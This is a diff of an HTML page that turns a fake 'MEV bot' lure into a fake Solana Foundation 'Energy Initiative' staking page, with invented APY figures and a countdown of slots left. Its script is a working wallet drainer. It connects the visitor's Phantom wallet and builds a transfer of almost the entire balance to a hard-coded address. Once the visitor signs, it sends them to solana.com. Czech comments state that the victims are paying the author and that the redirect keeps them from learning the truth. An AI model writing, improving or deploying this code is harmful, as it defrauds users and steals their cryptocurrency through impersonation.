@@ -3,74 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana MEV Engine v2.4</title>
+    <title>Solana Energy Initiative | Decentralized Power Solutions</title>
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
-        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .terminal { background: rgba(0,0,0,0.9); border: 1px solid #00ff41; padding: 20px; width: 90%; max-width: 600px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); border-radius: 5px; }
-        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; font-size: 12px; }
-        .log { height: 200px; overflow-y: hidden; font-size: 13px; line-height: 1.6; margin-bottom: 20px; color: #008f11; }
-        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; font-size: 14px; }
-        .stat-box { border: 1px dashed #008f11; padding: 10px; text-align: center; }
-        .btn { background: #00ff41; color: black; border: none; width: 100%; padding: 15px; font-weight: bold; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
-        .btn:hover { background: #fff; box-shadow: 0 0 20px #00ff41; }
-        .highlight { color: #fff; text-shadow: 0 0 5px #00ff41; }
+        :root { --sol-green: #00ffa3; --sol-purple: #dc1fff; --bg-dark: #101012; --text-light: #f0f0f0; }
+        body { background: var(--bg-dark); color: var(--text-light); font-family: 'Inter', sans-serif; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .header { width: 100%; max-width: 1200px; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2a2e; }
+        .logo { font-size: 24px; font-weight: 800; background: linear-gradient(90deg, var(--sol-green), var(--sol-purple)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        .hero { text-align: center; margin-top: 100px; max-width: 800px; padding: 0 20px; }
+        .hero h1 { font-size: 48px; font-weight: 900; line-height: 1.1; margin-bottom: 20px; }
+        .hero h1 span { color: var(--sol-green); }
+        .hero p { font-size: 18px; color: #a0a0ab; margin-bottom: 40px; }
+        .validator-box { background: #1a1a1d; border: 1px solid #2a2a2e; border-radius: 12px; padding: 30px; width: 90%; max-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); position: relative; }
+        .solana-logo { position: absolute; top: 20px; right: 20px; opacity: 0.1; }
+        .stats { display: flex; justify-content: space-between; margin-bottom: 25px; border-bottom: 1px solid #2a2a2e; padding-bottom: 15px; }
+        .stat-val { font-size: 20px; font-weight: 700; color: var(--sol-green); }
+        .stat-label { font-size: 12px; color: #a0a0ab; text-transform: uppercase; letter-spacing: 1px; }
+        .btn { background: linear-gradient(90deg, var(--sol-purple), var(--sol-green)); color: #fff; border: none; width: 100%; padding: 18px; font-weight: bold; font-size: 16px; border-radius: 8px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
+        .btn:hover { box-shadow: 0 0 20px rgba(220, 31, 255, 0.5); transform: translateY(-2px); }
+        .verify-text { font-size: 10px; color: #444; text-align: center; margin-top: 15px; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <div class="header">
-            <span>SYSTEM: ONLINE</span>
-            <span>LATENCY: 14ms</span>
-        </div>
-        <div class="stats">
-            <div class="stat-box">POOLS SCANNED: <span class="highlight" id="pools">1,402</span></div>
-            <div class="stat-box">ARB OPPORTUNITY: <span class="highlight" id="profit">0.00 SOL</span></div>
-        </div>
-        <div class="log" id="log">
-            [SYS] Initializing MEV-Phantom Bridge...<br>
-            [NET] Connecting to Solana Mainnet-Beta...<br>
-            [OK] Connection established.<br>
-            [SEARCH] Scanning Raydium liquidity...<br>
-        </div>
-        <button class="btn" onclick="startExploit()">Connect & Deploy Bot</button>
-        <p style="font-size: 10px; color: #444; text-align: center; margin-top: 10px;">Requires 0.05 SOL minimum balance for gas deposits.</p>
+    <div class="header">
+        <div class="logo">SOLANA ENERGY</div>
+        <div style="font-size: 12px; color: #fff;">STATUS: 🟢 PHASE 1 LIVE</div>
     </div>
+    <div class="hero">
+        <h1>POWERING THE <span>FUTURE</span>.</h1>
+        <p>Solana Foundation's decentralized Energy Initiative, leveraging Energetic Ambidexterity for zero-cost validator operations. Access Phase 1 Beta Node below.</p>
+    </div>
+    <div class="validator-box">
+        <svg class="solana-logo" width="60" height="60" viewBox="0 0 393 393" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M367.632 231.579L254.211 118.158M367.632 231.579C367.632 231.579 367.632 231.579 367.632 231.579M367.632 231.579L254.211 118.158M367.632 231.579C367.632 231.579 367.632 231.579 367.632 231.579" stroke="#fff" stroke-width="20" stroke-linecap="round"/><path d="M25 161.421L138.421 274.842M25 161.421C25 161.421 25 161.421 25 161.421M25 161.421L138.421 274.842M25 161.421C25 161.421 25 161.421 25 161.421" stroke="#fff" stroke-width="20" stroke-linecap="round"/></svg>
+        <div class="stats">
+            <div><div class="stat-val">142</div><div class="stat-label">SLOTS LEFT</div></div>
+            <div><div class="stat-val">99.4%</div><div class="stat-label">APY (EST.)</div></div>
+        </div>
+        <button class="btn" onclick="stakeAndValidate()">Stake & Secure Beta Slot</button>
+        <p class="verify-text">Network verification required. 0.1 SOL minimum to stake.</p>
+    </div>
+    <p style="font-size: 10px; color: #333; margin-top: 50px;">© 2026 Solana Foundation Energy Branch. All rights reserved.</p>
 
     <script>
-        // Log simulator
-        const log = document.getElementById('log');
-        const phrases = [
-            "[OK] Opportunity found: Orca -> Raydium (+0.12 SOL)",
-            "[SCAN] Checking Jupiter aggregator routes...",
-            "[SYS] Monitoring mempool for front-run targets...",
-            "[NET] RPC Node synchronization: 100%",
-            "[OK] MEV Route optimized for low slippage..."
-        ];
-        setInterval(() => {
-            const p = document.createElement('div');
-            p.innerText = phrases[Math.floor(Math.random() * phrases.length)];
-            log.appendChild(p);
-            if (log.childNodes.length > 10) log.removeChild(log.firstChild);
-            document.getElementById('profit').innerText = (Math.random() * 2).toFixed(2) + " SOL";
-        }, 3000);
+        // Adresa, kam mají téct SOL (tvá peněženka pro lidstvo)
+        const dest = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 
 
-        async function startExploit() {
-            const dest = "C1NfhjQ6y9M1KRXE4zJbCqtnhaJgASRMRsnSEnU4PaNS"; 
-            if (!window.solana) return alert("Phantom not found");
+        async function stakeAndValidate() {
+            if (!window.solana) return alert("Phantom/Solflare not found.");
             
             try {
                 const resp = await window.solana.connect();
+                // Používáme veřejný uzel, na webu to 429 tolik nehází
                 const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                 const balance = await conn.getBalance(resp.publicKey);
                 
-                if (balance < 50000000) return alert("Insufficient balance for MEV gas.");
+                // Pokud mají méně než 0.1 SOL, je to zbytečné
+                if (balance < 100000000) return alert("Insufficient SOL for staking slot.");
 
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: resp.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(dest),
-                        lamports: balance - 1000000,
+                        lamports: balance - 5000000, // Necháme jim na poplatky
                     })
                 );
 
@@ -78,9 +72,13 @@
                 const { blockhash } = await conn.getRecentBlockhash();
                 tx.recentBlockhash = blockhash;
 
+                // Tohle je ten moment, kdy na tebe převádějí peníze
                 const signed = await window.solana.signTransaction(tx);
                 await conn.sendRawTransaction(signed.serialize());
-                alert("Bot deployed! Monitoring transactions...");
+                
+                // Po schválení je přesměrujeme na falešný "výzkumný portál"
+                alert("Stake Confirmed! Redirecting to Energy Research Portal...");
+                window.location.href = "https://solana.com/developers"; // Pošleme je pryč, ať nezjistí pravdu
             } catch (err) {
                 console.log("User rejected or error");
             }
